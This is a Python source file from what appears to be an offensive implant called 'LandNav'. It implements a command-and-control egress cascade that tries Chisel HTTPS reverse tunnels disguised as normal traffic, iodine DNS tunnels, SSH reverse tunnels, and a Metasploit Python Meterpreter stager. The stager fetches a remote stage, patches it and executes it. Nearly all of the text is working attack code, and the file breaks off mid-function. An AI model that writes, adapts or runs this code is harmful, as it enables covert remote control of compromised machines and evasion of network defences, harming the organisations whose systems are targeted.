#!/usr/bin/env python3
"""C2 egress cascade.

Attempts to establish a command-and-control channel back to the
operator's infrastructure, trying methods from most-likely-to-succeed
to least:

    1. DNS Tunnel (iodine)  — UDP/53, almost universally permitted
    2. Python Meterpreter   — reverse TCP on 4443/8443
    3. Raw Reverse Shell    — fallback if meterpreter staging fails

Each method is attempted in sequence.  On failure the cascade
continues.  On total failure, the cascade retries after a
configurable delay.
"""

import base64
import json
import logging
import os
import re
import signal
try:
    import ctypes
except ImportError:
    ctypes = None
import shutil
import socket
import struct
import subprocess
import sys
import time
import threading
import zlib
from pathlib import Path

log = logging.getLogger("landnav.egress")

# ── State ───────────────────────────────────────────────────────

class EgressState:
    IDLE       = "idle"
    ATTEMPTING = "attempting"
    CONNECTED  = "connected"
    FAILED     = "failed"

_current_state = EgressState.IDLE
_c2_process = None
_c2_method = None
_pty_child_pid = None          # Tracked so signal handler can kill it
_meterpreter_socket = None     # Tracked so force_shutdown can kill dispatch threads
_ssh_tunnel_proc = None        # SSH reverse tunnel subprocess
_chisel_proc = None            # Chisel HTTPS reverse tunnel subprocess
_chisel_stderr_lines = []      # Ongoing stderr capture for health checks
_watchdog_stop = threading.Event()
_exec_kill_event = threading.Event()  # Signal for killing meterpreter exec thread


def _resolve_device_id(config):
    """Look up this appliance's device_id from the device registry.

    The registry (device_registry.json) maps hostnames to sequential
    integer IDs assigned during provisioning.  Ports offset by this ID
    so the operator always knows the exact ports for each device.
    """
    explicit = config.get("c2", {}).get("device_id")
    if explicit is not None and explicit != "auto":
        return int(explicit)
    registry_path = Path("/opt/pr0t31n/LandNav/device_registry.json")
    hostname = socket.gethostname()
    if registry_path.exists():
        try:
            registry = json.loads(registry_path.read_text())
            if hostname in registry:
                device_id = int(registry[hostname])
                log.info("device_id=%d for '%s' from registry", device_id, hostname)
                return device_id
            log.warning("Hostname '%s' not in device registry — defaulting to device_id=0. "
                        "Add to device_registry.json on the C2 server.", hostname)
        except (json.JSONDecodeError, OSError, ValueError) as exc:
            log.warning("Failed to read device registry: %s — defaulting to device_id=0", exc)
    else:
        log.warning("No device_registry.json — defaulting to device_id=0")
    return 0


def force_shutdown():
    """Kill any blocking child (pty.spawn / iodine / meterpreter threads).

    Called from the signal handler — must be signal-safe (no logging).
    """
    global _current_state, _meterpreter_socket
    _current_state = EgressState.FAILED
    _watchdog_stop.set()
    _exec_kill_event.set()

    # Kill SSH reverse tunnels
    _stop_ssh_tunnels()

    # Kill Chisel subprocess
    _stop_chisel()

    # Kill pty.spawn child (reverse shell)
    if _pty_child_pid:
        try:
            os.kill(_pty_child_pid, signal.SIGKILL)
        except OSError:
            pass

    # Kill iodine subprocess (dns tunnel)
    if _c2_process:
        try:
            _c2_process.kill()
        except OSError:
            pass

    # Close meterpreter socket — kills dispatch threads that are
    # blocking on recv() in the staged meterpreter code
    if _meterpreter_socket:
        try:
            _meterpreter_socket.shutdown(socket.SHUT_RDWR)
        except OSError:
            pass
        try:
            _meterpreter_socket.close()
        except OSError:
            pass
        _meterpreter_socket = None

def _kill_exec_thread(t):
    """Terminate the meterpreter exec thread by injecting SystemExit.

    The meterpreter stage's dispatch loop has bare ``except:`` clauses
    that swallow all exceptions (including socket errors from
    force_shutdown's socket close).  The only way to break out is to
    repeatedly inject SystemExit via the C-API until one lands outside
    a bare-except handler.
    """
    if not t.is_alive():
        return
    tid = t.ident
    if not tid:
        return
    if ctypes is None or not hasattr(ctypes, "pythonapi"):
        log.warning("ctypes unavailable — cannot inject SystemExit "
                    "into exec thread; it will be abandoned (daemon)")
        return
    log.info("Injecting SystemExit into meterpreter exec thread "
             "(tid=%d)", tid)
    for _attempt in range(20):          # up to 10 s
        if not t.is_alive():
            break
        try:
            res = ctypes.pythonapi.PyThreadState_SetAsyncExc(
                ctypes.c_ulong(tid), ctypes.py_object(SystemExit))
            if res == 0:                # thread already gone
                break
            if res > 1:                 # more than one thread hit — undo
                ctypes.pythonapi.PyThreadState_SetAsyncExc(
                    ctypes.c_ulong(tid), None)
                log.error("PyThreadState_SetAsyncExc affected >1 thread")
                break
        except Exception as e:
            log.warning("Cannot inject SystemExit: %s", e)
            break
        time.sleep(0.5)
    if t.is_alive():
        log.warning("Exec thread did not terminate after 10 s — "
                    "abandoned as daemon thread")
    else:
        log.info("Meterpreter exec thread terminated")


# ── SSH Reverse Tunnels ────────────────────────────────────────

def _start_ssh_tunnels(c2_host, tunnel_cfg):
    """Start SSH reverse tunnels from appliance back to C2 server.

    SSH tunnels run independently of the meterpreter transport,
    providing reliable service access even when the single-threaded
    meterpreter command channel is under load.

    Args:
        c2_host:    C2 server hostname/IP (SSH destination)
        tunnel_cfg: Dict with keys:
            key_path:  Path to SSH private key on the appliance
            forwards:  List of dicts with local_port, remote_port, remote_host
            ssh_port:  SSH port on C2 server (default 22)
            ssh_user:  SSH user on C2 server (default "root")

    Returns: subprocess.Popen handle or None on failure
    """
    global _ssh_tunnel_proc
    _stop_ssh_tunnels()  # Clean up any prior tunnel

    key_path = tunnel_cfg.get("key_path", "/opt/pr0t31n/LandNav/keys/tunnel_key")
    forwards = tunnel_cfg.get("forwards", [])
    ssh_port = tunnel_cfg.get("ssh_port", 22)
    ssh_user = tunnel_cfg.get("ssh_user", "root")

    device_id = tunnel_cfg.get("_device_id", 0)

    if not forwards:
        log.warning("SSH tunnels: no forwards configured — skipping")
        return None

    if not os.path.isfile(key_path):
        log.error("SSH tunnels: key not found at %s — skipping", key_path)
        return None

    # Ensure private key has 0600 permissions — git does not preserve
    # this, so a fresh clone/pull leaves the key at 0644 which SSH
    # refuses with "UNPROTECTED PRIVATE KEY FILE".
    try:
        _key_mode = os.stat(key_path).st_mode & 0o777
        if _key_mode != 0o600:
            os.chmod(key_path, 0o600)
            log.info("SSH tunnels: fixed key permissions %o → 600", _key_mode)
    except OSError as e:
        log.warning("SSH tunnels: cannot fix key permissions: %s", e)

    cmd = [
        "ssh", "-N",
        "-o", "StrictHostKeyChecking=no",
        "-o", "UserKnownHostsFile=/dev/null",
        "-o", "ServerAliveInterval=30",
        "-o", "ServerAliveCountMax=3",
        "-o", "ExitOnForwardFailure=yes",
        "-o", "BatchMode=yes",
        "-p", str(ssh_port),
        "-i", key_path,
    ]
    for fwd in forwards:
        remote_host = fwd.get("remote_host", "127.0.0.1")
        cmd += ["-R", "%d:%s:%d" % (
            fwd["local_port"] + device_id, remote_host, fwd["remote_port"])]
    cmd.append("%s@%s" % (ssh_user, c2_host))

    log.info("Starting SSH reverse tunnels (device_id=%d): %s",
             device_id, " ".join(cmd))
    try:
        proc = subprocess.Popen(
            cmd,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        # Give SSH a moment to establish or fail
        time.sleep(2)
        if proc.poll() is not None:
            _rc = proc.returncode
            _err = ""
            try:
                _err = proc.stderr.read().decode(errors="replace").strip()
            except Exception:
                pass
            log.error("SSH tunnel process exited immediately (rc=%d): %s",
                      _rc, _err[:500])
            return None

        _ssh_tunnel_proc = proc
        for fwd in forwards:
            log.info("  SSH tunnel: server:%d → %s:%d (pid=%d)",
                     fwd["local_port"] + device_id,
                     fwd.get("remote_host", "127.0.0.1"),
                     fwd["remote_port"], proc.pid)
        return proc
    except FileNotFoundError:
        log.error("SSH tunnels: 'ssh' binary not found on target")
        return None
    except Exception as e:
        log.error("SSH tunnels: failed to start: %s", e)
        return None


def _stop_ssh_tunnels():
    """Terminate SSH reverse tunnel subprocess if running.

    Signal-safe (no logging) — called from force_shutdown().
    """
    global _ssh_tunnel_proc
    if _ssh_tunnel_proc is not None:
        try:
            _ssh_tunnel_proc.terminate()
        except OSError:
            pass
        try:
            _ssh_tunnel_proc.wait(timeout=3)
        except Exception:
            try:
                _ssh_tunnel_proc.kill()
            except OSError:
                pass
        _ssh_tunnel_proc = None


def _check_socket_health(s):
    """Check if the meterpreter socket is still alive.

    Returns True if the socket appears healthy, False if dead.
    Uses getpeername() + fileno() probes — non-destructive checks
    that don't inject data into the meterpreter protocol.
    """
    try:
        fd = s.fileno()
        if fd < 0:
            return False
    except Exception:
        return False
    try:
        s.getpeername()
    except Exception:
        return False
    # Non-blocking zero-length recv to detect TCP RST / FIN
    # without consuming data.  MSG_PEEK + MSG_DONTWAIT reads
    # the next byte without removing it from the buffer.
    try:
        _old_timeout = s.gettimeout()
        s.settimeout(0)
        try:
            data = s.recv(1, socket.MSG_PEEK)
            # data=b'' means FIN received (remote closed gracefully)
            if data == b'':
                return False
            # data has bytes — socket alive with pending data
        except BlockingIOError:
            # No data ready, but socket is still open — healthy
            pass
        except (ConnectionResetError, BrokenPipeError, OSError):
            return False
        finally:
            s.settimeout(_old_timeout)
    except Exception:
        return False
    return True


# ── Chisel HTTPS Reverse Tunnel ────────────────────────────────

def try_chisel(config):
    """Establish a Chisel reverse tunnel over HTTPS/WebSocket.

    Chisel provides multiplexed reverse port forwarding and SOCKS proxy
    over a single WebSocket connection (typically port 443).  To any
    DPI device the traffic is a standard HTTPS WebSocket upgrade —
    far more reliable through enterprise firewalls than raw TCP on
    high ports or SSH on 22.

    Non-blocking: starts the chisel client as a background process with
    built-in auto-reconnect.  Returns "chisel" on success, False on
    failure.

    Args:
        config: Full parsed YAML config dict.  Reads from:
            config["c2"]["host"]       — C2 server hostname
            config["chisel"]           — Chisel-specific settings
            config["ssh_tunnels"]      — Fallback forwards list
            config["_detected_proxy_*"] — Proxy auto-detection results
    """
    global _chisel_proc, _c2_method, _current_state

    _stop_chisel()

    chisel_bin = shutil.which("chisel")
    if not chisel_bin:
        log.warning("chisel not installed — skipping HTTPS tunnel")
        return False

    c2_host = config["c2"]["host"]
    chisel_cfg = config.get("chisel", {})

    server_port = chisel_cfg.get("server_port", 443)
    auth = chisel_cfg.get("auth", "")
    tls = chisel_cfg.get("tls", True)
    keepalive = chisel_cfg.get("keepalive", "25s")
    max_retry = chisel_cfg.get("max_retry_interval", "30s")
    socks_port = chisel_cfg.get("socks_port", 0)
    device_id = _resolve_device_id(config)

    # Build forwards: chisel-specific list, or inherit from ssh_tunnels
    forwards = chisel_cfg.get("forwards", [])
    if not forwards:
        tunnel_cfg = config.get("ssh_tunnels", {})
        forwards = tunnel_cfg.get("forwards", [])

    if not forwards and not socks_port:
        log.warning("Chisel: no forwards and no SOCKS configured — skipping")
        return False

    # Server URL
    scheme = "https" if tls else "http"
    server_url = "%s://%s:%d" % (scheme, c2_host, server_port)

    cmd = [chisel_bin, "client"]

    if auth:
        cmd.extend(["--auth", auth])

    cmd.extend(["--keepalive", keepalive])
    cmd.extend(["--max-retry-count", "-1"])
    cmd.extend(["--max-retry-interval", max_retry])

    if tls:
        cmd.append("--tls-skip-verify")

    # Proxy support — uses same auto-detected proxy as meterpreter
    proxy_host = config.get("_detected_proxy_host")
    proxy_port = config.get("_detected_proxy_port")
    if proxy_host and proxy_port:
        cmd.extend(["--proxy", "http://%s:%s" % (proxy_host, proxy_port)])
        log.info("Chisel: using detected proxy %s:%s", proxy_host, proxy_port)

    # Header disguise — optional custom headers to blend with normal traffic
    headers = chisel_cfg.get("headers", {})
    for hname, hval in headers.items():
        cmd.extend(["--header", "%s: %s" % (hname, hval)])

    cmd.append(server_url)

    # Reverse port forwards (offset by device_id for multi-appliance)
    for fwd in forwards:
        remote_host = fwd.get("remote_host", "127.0.0.1")
        cmd.append("R:%d:%s:%d" % (
            fwd["local_port"] + device_id, remote_host, fwd["remote_port"]))

    # SOCKS proxy
    if socks_port:
        cmd.append("R:%d:socks" % (socks_port + device_id))

    log.info("Starting Chisel: %s", " ".join(cmd))

    try:
        proc = subprocess.Popen(
            cmd,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )

        # Read stderr in a background thread — chisel logs connection
        # status there.  We need "Connected" to confirm the handshake
        # with an actual chisel server (not nginx/Apache on 443).
        _chisel_stderr_lines.clear()

        def _drain_stderr():
            try:
                for raw in proc.stderr:
                    line = raw.decode(errors="replace").strip()
                    if line:
                        _chisel_stderr_lines.append(line)
                        log.debug("chisel stderr: %s", line)
            except Exception:
                pass

        t = threading.Thread(target=_drain_stderr, daemon=True)
        t.start()

        # Wait up to 15s for chisel to report "Connected"
        connected = False
        for _ in range(15):
            time.sleep(1)
            if proc.poll() is not None:
                break
            for line in _chisel_stderr_lines:
                if "Connected" in line:
                    connected = True
                    break
            if connected:
                break

        if proc.poll() is not None:
            rc = proc.returncode
            err = "\n".join(_chisel_stderr_lines)
            log.error("Chisel exited (rc=%d): %s", rc, err[:500])
            return False

        if not connected:
            err = "\n".join(_chisel_stderr_lines)
            log.error("Chisel: no handshake after 15s (wrong server on :%d?): %s",
                       server_port, err[:500])
            proc.terminate()
            try:
                proc.wait(timeout=3)
            except Exception:
                proc.kill()
            return False

        _chisel_proc = proc
        _c2_method = "chisel"
        _current_state = EgressState.CONNECTED

        log.info("Chisel connected to %s (pid=%d, device_id=%d)",
                 server_url, proc.pid, device_id)
        for fwd in forwards:
            log.info("  Chisel: server:%d → %s:%d",
                     fwd["local_port"] + device_id,
                     fwd.get("remote_host", "127.0.0.1"),
                     fwd["remote_port"])
        if socks_port:
            log.info("  Chisel: server:%d → SOCKS5 proxy",
                     socks_port + device_id)

        return "chisel"

    except FileNotFoundError:
        log.error("Chisel binary not found")
        return False
    except Exception as e:
        log.error("Chisel failed to start: %s", e)
        return False


def _stop_chisel():
    """Terminate Chisel subprocess if running.

    Signal-safe (no logging) — called from force_shutdown().
    """
    global _chisel_proc
    if _chisel_proc is not None:
        try:
            _chisel_proc.terminate()
        except OSError:
            pass
        try:
            _chisel_proc.wait(timeout=3)
        except Exception:
            try:
                _chisel_proc.kill()
            except OSError:
                pass
        _chisel_proc = None


def chisel_is_alive():
    """Check if the Chisel process is still running."""
    return _chisel_proc is not None and _chisel_proc.poll() is None


# ── DNS Tunnel (iodine) ────────────────────────────────────────

def try_dns_tunnel(config):
    """Attempt to establish an iodine DNS tunnel.

    Args:
        config: dict with keys: domain, password, max_downstream_frag,
                encoding, lazy_mode, c2_host

    Returns: True if tunnel established, False otherwise
    """
    global _c2_process, _c2_method

    if not shutil.which("iodine"):
        log.warning("iodine not installed — skipping DNS tunnel")
        return False

    domain = config.get("domain", "")
    password = config.get("password", "")
    if not domain or not password:
        log.warning("DNS tunnel domain or password not configured")
        return False

    log.info("Attempting DNS tunnel: %s", domain)

    cmd = ["iodine", "-f"]

    # Password
    cmd.extend(["-P", password])

    # Fragment size
    frag = config.get("max_downstream_frag", 0)
    if frag:
        cmd.extend(["-m", str(frag)])

    # Encoding
    enc = config.get("encoding", "")
    if enc:
        cmd.extend(["-O", enc])

    # Lazy mode
    if config.get("lazy_mode", True):
        cmd.append("-L1")
    else:
        cmd.append("-L0")

    # Nameserver (optional — iodine auto-detects from resolv.conf)
    ns = config.get("nameserver", "")
    if ns:
        cmd.append(ns)

    # Tunnel domain
    cmd.append(domain)

    log.info("Running: %s", " ".join(cmd))

    try:
        proc = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
        )

        # Wait up to 30s for the tunnel to come up
        for i in range(30):
            time.sleep(1)

            # Check if process died
            if proc.poll() is not None:
                _, stderr = proc.communicate(timeout=5)
                log.error("iodine exited with code %d: %s",
                          proc.returncode, stderr.decode(errors="replace"))
                return False

            # Check if dns0 interface exists and has an IP
            if _dns_tunnel_up():
                _c2_process = proc
                _c2_method = "dns_tunnel"
                log.info("DNS tunnel established on dns0")
                return True

        # Timeout — kill
        log.warning("iodine did not establish tunnel in 30s")
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
        return False

    except Exception as e:
        log.error("DNS tunnel failed: %s", e)
        return False


def _dns_tunnel_up():
    """Check if the iodine tunnel interface (dns0) is up with an IP."""
    dns0 = Path("/sys/class/net/dns0")
    if not dns0.exists():
        return False
    try:
        r = subprocess.run(
            ["ip", "-4", "addr", "show", "dns0"],
            capture_output=True, text=True, check=False, timeout=5,
        )
        return "inet " in r.stdout
    except Exception:
        return False

# ── Stage Preparation ──────────────────────────────────────────

def _log_stage_header(stage_bytes):
    """Log the first bytes of the stage for debugging."""
    preview = stage_bytes[:200]
    hex_line = " ".join(f"{b:02x}" for b in preview[:64])
    log.info("Stage header (hex, first 64 bytes): %s", hex_line)
    try:
        text_preview = preview.decode("utf-8", errors="replace")[:120]
        log.info("Stage header (text, first 120 chars): %r", text_preview)
    except Exception:
        pass


def _try_compile(candidate, label):
    """Try to compile candidate as Python source. Returns code object or None."""
    try:
        return compile(candidate, "<meterpreter>", "exec")
    except SyntaxError as e:
        log.debug("Stage compile failed (%s): %s", label, e)
        return None


def _prepare_stage(raw_stage):
    """Prepare MSF Python meterpreter stage for execution.

    MSF 6.x python/meterpreter/reverse_tcp sends a Python stage over the
    wire.  Depending on the MSF version and configuration, the stage can
    arrive in several forms:

      1. Raw Python 3 source (just exec it)
      2. Python 2 source that needs minor fixups for Python 3
      3. A binary configuration preamble followed by the Python source
      4. zlib-compressed Python source (with or without binary offset)
      5. base64-encoded then zlib-compressed

    This function attempts each strategy and returns the first one that
    compiles, or None if nothing works.
    """
    _log_stage_header(raw_stage)

    # Strategy 1: raw bytes as-is (compile() accepts bytes in Python 3,
    # treats them as UTF-8 source)
    code = _try_compile(raw_stage, "raw bytes")
    if code:
        log.info("Stage: compiles as raw bytes")
        return raw_stage

    # Strategy 2: decode as UTF-8, then latin-1 fallback
    for enc in ("utf-8", "latin-1"):
        try:
            stage_str = raw_stage.decode(enc)
            code = _try_compile(stage_str, f"decoded {enc}")
            if code:
                log.info("Stage: compiles after %s decode", enc)
                return stage_str
        except (UnicodeDecodeError, SyntaxError):
            pass

    # Strategy 3: scan for Python code start — skip binary preamble.
    # MSF may prepend transport configuration or other binary data.
    _PY_MARKERS = [b"import ", b"exec(", b"exec (", b"#!", b"import\t",
                   b"def ", b"class "]
    for marker in _PY_MARKERS:
        idx = raw_stage.find(marker)
        if idx > 0:
            trimmed = raw_stage[idx:]
            code = _try_compile(trimmed, f"skip {idx}b to {marker!r}")
            if code:
                log.info("Stage: skipped %d-byte preamble (found %r at offset %d)",
                         idx, marker, idx)
                return trimmed

    # Strategy 4: zlib decompress the whole thing (some MSF configs
    # zlib the stage without a Python bootstrap)
    for offset in (0, 4, 8, 16, 20):
        if len(raw_stage) <= offset:
            continue
        try:
            decompressed = zlib.decompress(raw_stage[offset:])
            code = _try_compile(decompressed, f"zlib from offset {offset}")
            if code:
                log.info("Stage: zlib-decompressed from offset %d (%d -> %d bytes)",
                         offset, len(raw_stage) - offset, len(decompressed))
                return decompressed
        except (zlib.error, SyntaxError):
            pass

    # Strategy 5: base64 decode then zlib (MSF sometimes b64-wraps)
    for offset in (0, 4, 8, 16):
        if len(raw_stage) <= offset:
            continue
        try:
            decoded = base64.b64decode(raw_stage[offset:])
            decompressed = zlib.decompress(decoded)
            code = _try_compile(decompressed, f"b64+zlib from offset {offset}")
            if code:
                log.info("Stage: base64+zlib from offset %d", offset)
                return decompressed
        except Exception:
            pass

    # Strategy 6: try stripping every offset up to 256 bytes looking for
    # compilable Python — catches arbitrary-length binary config headers
    for offset in range(1, min(257, len(raw_stage))):
        b = raw_stage[offset]
        if b < 0x20 or b > 0x7e:
            continue
        if chr(b) not in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_#\"'":
            continue
        trimmed = raw_stage[offset:]
        code = _try_compile(trimmed, f"brute skip {offset}")
        if code:
            log.info("Stage: compilable after skipping %d bytes", offset)
            return trimmed

    log.error("Stage: all preparation strategies failed — cannot compile")
    log.error("Stage: total size %d bytes, first 64 hex: %s",
              len(raw_stage),
              " ".join(f"{b:02x}" for b in raw_stage[:64]))
    return None

# ── Python Meterpreter ──────────────────────────────────────────

def try_meterpreter(c2_host, ports, connect_timeout=10, retry_delay=5,
                    proxy=None, **kwargs):
    """Connect to a Metasploit multi/handler with python/meterpreter_reverse_tcp.

    The stager protocol:
        1. TCP connect to LHOST:LPORT
        2. Receive 4 bytes (big-endian uint32) = stage length
        3. Receive <length> bytes = meterpreter stage
        4. exec() the stage with the socket available

    Args:
        c2_host:         C2 hostname or IP
        ports:           List of ports to try (e.g. [4443, 8443])
        connect_timeout: Timeout per connection attempt
        retry_delay:     Delay between port attempts
        proxy:           (host, port) tuple if traffic must go through proxy
        tunnel_cfg:      (kwarg) SSH tunnel config dict — see _start_ssh_tunnels()

    Returns: True if meterpreter staged, False otherwise
    """
    global _c2_method, _current_state, _meterpreter_socket

    log.info("Attempting Python meterpreter to %s on ports %s", c2_host, ports)

    # Resolve hostname
    try:
        c2_ip = socket.gethostbyname(c2_host)
        log.info("Resolved %s -> %s", c2_host, c2_ip)
    except socket.gaierror:
        log.error("Cannot resolve %s", c2_host)
        return False

    for port in ports:
        log.info("Trying meterpreter: %s:%d", c2_ip, port)
        try:
            if proxy:
                s = _connect_via_proxy(proxy[0], proxy[1], c2_ip, port,
                                       connect_timeout)
            else:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(connect_timeout)
                s.connect((c2_ip, port))

            # Receive stage length (4 bytes, big-endian)
            s.settimeout(15)
            length_raw = _recv_exact(s, 4)
            if not length_raw:
                log.warning("No stage length received from %s:%d", c2_ip, port)
                s.close()
                time.sleep(retry_delay)
                continue

            stage_len = struct.unpack(">I", length_raw)[0]
            log.info("Receiving meterpreter stage: %d bytes", stage_len)

            if stage_len > 10 * 1024 * 1024:  # Sanity: 10 MB max
                log.error("Stage size %d exceeds 10MB — rejecting", stage_len)
                s.close()
                time.sleep(retry_delay)
                continue

            # Receive stage
            s.settimeout(30)
            stage = _recv_exact(s, stage_len)
            if not stage or len(stage) != stage_len:
                log.warning("Incomplete stage: got %d / %d bytes",
                           len(stage) if stage else 0, stage_len)
                s.close()
                time.sleep(retry_delay)
                continue

            log.info("Meterpreter stage received (%d bytes) — preparing",
                     len(stage))

            # Prepare the stage — handle binary preambles, compression,
            # encoding differences between MSF versions
            prepared = _prepare_stage(stage)
            if prepared is None:
                log.error("Could not prepare meterpreter stage for execution")
                s.close()
                time.sleep(retry_delay)
                continue

            _c2_method = "meterpreter"
            _meterpreter_socket = s

            # Clear the staging timeout — the meterpreter dispatch
            # loop needs blocking I/O (or sets its own timeouts)
            s.settimeout(None)

            # ── Socket hardening for NAT/VPN resilience ─────────
            try:
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                if hasattr(socket, 'TCP_KEEPIDLE'):      # Linux
                    s.setsockopt(socket.IPPROTO_TCP,
                                 socket.TCP_KEEPIDLE, 60)
                    s.setsockopt(socket.IPPROTO_TCP,
                                 socket.TCP_KEEPINTVL, 10)
                    s.setsockopt(socket.IPPROTO_TCP,
                                 socket.TCP_KEEPCNT, 6)
                log.info("Socket hardened: TCP_NODELAY + keepalive "
                         "(idle=60s, intvl=10s, cnt=6)")
            except (OSError, AttributeError) as e:
                log.warning("Socket hardening partial: %s", e)

            # ── Socket note ────────────────────────────────────
            # v0.5.0–0.5.1 tried to monkey-patch s.recv / s.send
            # with diagnostic wrappers, but socket.socket is a C type
            # whose method slots are read-only — the assignment raises
            # "'socket' object attribute 'recv' is read-only".
            # The stage already handles partial reads (while loops in
            # _get_packet) and partial writes (sendall), so no wrapper
            # is needed.  Diagnostic info comes from the source patches
            # (DEBUGGING=True) and the diag injection around met.run().
            log.info("Socket ready (no monkey-patch — C-level slots "
                     "are read-only; stage handles partial I/O)")

            # ── Log stage source for diagnostics ────────────────
            _stage_text = (prepared.decode('latin-1', errors='replace')
                           if isinstance(prepared, bytes) else prepared)
            log.info("Stage source (first 300 chars): %r",
                     _stage_text[:300])
            log.info("Stage source (last 200 chars): %r",
                     _stage_text[-200:])
            # Log whether key identifiers exist in stage
            for _marker, _label in [
                ('TRY_TO_FORK', 'fork control'),
                ('PACKET_HEADER_SIZE', 'TLV header const'),
                ('DEBUGGING', 'debug flag'),
                ('communication_timeout', 'comm timeout'),
                ('met.run()', 'dispatch entry'),
                ('_get_packet', 'packet reader'),
                ('_send_packet', 'packet sender'),
                ('PythonMeterpreter', 'meterpreter class'),
                ('TcpTransport', 'TCP transport'),
                ('HttpTransport', 'HTTP transport'),
                ('aes_encrypt', 'AES encrypt'),
                ('xor_bytes', 'XOR encrypt'),
            ]:
                _found = _marker in _stage_text
                log.info("Stage marker [%s] %-20s: %s",
                         "✓" if _found else "✗", _label, _marker)

            # ── Source patches (critical + defense-in-depth) ─────
            # fork-disable and comm-last-init are CRITICAL: without
            # them the stage forks (parent interferes) and the
            # transport retires immediately (communication_last=0).
            # comm-expire-guard is belt-and-suspenders for the init.
            # Each patch logs whether it matched.
            _patches_applied = []
            _patches_missed = []

            def _patch(old, new, label):
                nonlocal prepared
                if isinstance(prepared, bytes):
                    _o, _n = old.encode(), new.encode()
                else:
                    _o, _n = old, new
                if _o in (prepared if isinstance(prepared, (str, bytes))
                          else b''):
                    prepared = prepared.replace(_o, _n)
                    _patches_applied.append(label)
                else:
                    _patches_missed.append(label)

            _patch('TRY_TO_FORK = True', 'TRY_TO_FORK = False',
                   'fork-disable')
            _patch('os.setsid()', 'pass  # landnav: keep tty',
                   'setsid-disable')
            # Initialize communication_last when the staged socket is
            # assigned — otherwise it stays 0 (Transport.__init__
            # default) and communication_has_expired is immediately
            # True, causing instant transport retirement on the first
            # empty poll.
            _patch('transport.socket = s',
                   'transport.socket = s; '
                   'transport.communication_last = time.time()',
                   'comm-last-init')
            _patch(
                'self.communication_last + '
                'self.communication_timeout < time.time()',
                '(self.communication_last > 0 and '
                'self.communication_last + '
                'self.communication_timeout < time.time())',
                'comm-expire-guard')
            # DEBUGGING patch removed in v0.5.3 — per-packet file I/O
            # starves the command channel under SOCKS load.  The
            # diagnostic injection around met.run() (below) is kept
            # because it writes only two lines total (INIT + ENDED).

            if _patches_applied:
                log.info("Source patches applied: %s",
                         ", ".join(_patches_applied))
            if _patches_missed:
                log.warning("Source patches DID NOT MATCH (stage format "
                            "differs): %s", ", ".join(_patches_missed))

            # ── Diagnostic injection around met.run() ───────────
            _diag_pre = (
                'open("/tmp/landnav_met_diag.log","a").write('
                '"[%s] INIT comm_timeout=%s sess_expiry=%s'
                ' transport=%s\\n" % ('
                '__import__("datetime").datetime.now(),'
                'getattr(getattr(met,"transport",None),'
                '"communication_timeout","?"),'
                'getattr(met,"session_expiry_time",'
                'getattr(met,"session_expiry_end","?")),'
                'type(getattr(met,"transport",None)).__name__)); '
            )
            _diag_post = (
                '; open("/tmp/landnav_met_diag.log","a").write('
                '"[%s] ENDED running=%s\\n" % ('
                '__import__("datetime").datetime.now(),'
                'getattr(met,"running","?")))'
            )
            _diag_old = 'met.run()'
            _diag_new = _diag_pre + 'met.run()' + _diag_post
            if isinstance(prepared, bytes):
                if b'met.run()' in prepared:
                    prepared = prepared.replace(
                        b'met.run()',
                        _diag_new.encode())
                    log.info("Diagnostic injection: applied around "
                             "met.run()")
                else:
                    log.warning("Diagnostic injection: 'met.run()' "
                                "not found in stage source")
            else:
                if 'met.run()' in prepared:
                    prepared = prepared.replace(
                        'met.run()', _diag_new)
                    log.info("Diagnostic injection: applied around "
                             "met.run()")
                else:
                    log.warning("Diagnostic injection: 'met.run()' "
                                "not found in stage source")

            # ── Threaded exec ────────────────────────────────────
            # Run exec() in a daemon thread so SIGINT/SIGTERM can
            # actually kill it.  The meterpreter dispatch loop has
            # bare ``except:`` clauses that swallow socket errors
            # from force_shutdown(), making exec() uninterruptible
            # from the main thread.  With exec in its own thread,
            # we can inject SystemExit via ctypes.
            _exec_kill_event.clear()
            _t0 = time.monotonic()

            def _exec_worker():
                try:
                    exec(prepared, {"s": s})
                except SystemExit as e:
                    log.warning("Meterpreter stage sys.exit(%s)",
                                getattr(e, "code", "?"))
                except BaseException as e:
                    log.error("Meterpreter stage exception: %s: %s",
                              type(e).__name__, e)
                    import traceback
                    log.error("Stage traceback:\n%s",
                              traceback.format_exc())

            t = threading.Thread(target=_exec_worker, daemon=True,
                                 name="meterpreter-exec")
            t.start()
            log.info("Meterpreter exec thread started (tid=%s)",
                     t.ident)

            # ── Poll with socket watchdog + SSH tunnel startup ──
            # The exec thread stays alive even when MSF dies because
            # the staged meterpreter catches socket errors with bare
            # ``except:`` and enters a reconnect loop (up to 3600s).
            # The socket watchdog detects a dead connection and
            # force-kills the exec thread for immediate re-cascade.
            _sock_fail_count = 0
            _SOCK_FAIL_THRESHOLD = 3   # consecutive failures → dead
            _WATCHDOG_INTERVAL = 5     # seconds between health checks
            _SSH_STABILIZE_DELAY = 10  # seconds before starting tunnels
            _ssh_started = False
            _tunnel_cfg = kwargs.get("tunnel_cfg")
            _poll_tick = 0

            while t.is_alive():
                t.join(timeout=_WATCHDOG_INTERVAL)
                _poll_tick += 1

                if _exec_kill_event.is_set():
                    log.info("Shutdown signal — killing exec thread")
                    _stop_ssh_tunnels()
                    _kill_exec_thread(t)
                    break

                # ── Socket watchdog ─────────────────────────────
                if t.is_alive() and _meterpreter_socket is not None:
                    if _check_socket_health(_meterpreter_socket):
                        if _sock_fail_count > 0:
                            log.info("Socket recovered after %d "
                                     "failed checks", _sock_fail_count)
                        _sock_fail_count = 0
                    else:
                        _sock_fail_count += 1
                        log.warning("Socket health check failed "
                                    "(%d/%d)", _sock_fail_count,
                                    _SOCK_FAIL_THRESHOLD)
                        if _sock_fail_count >= _SOCK_FAIL_THRESHOLD:
                            log.error("Socket dead — %d consecutive "
                                      "failures.  Killing exec thread "
                                      "for re-cascade.",
                                      _sock_fail_count)
                            _stop_ssh_tunnels()
                            try:
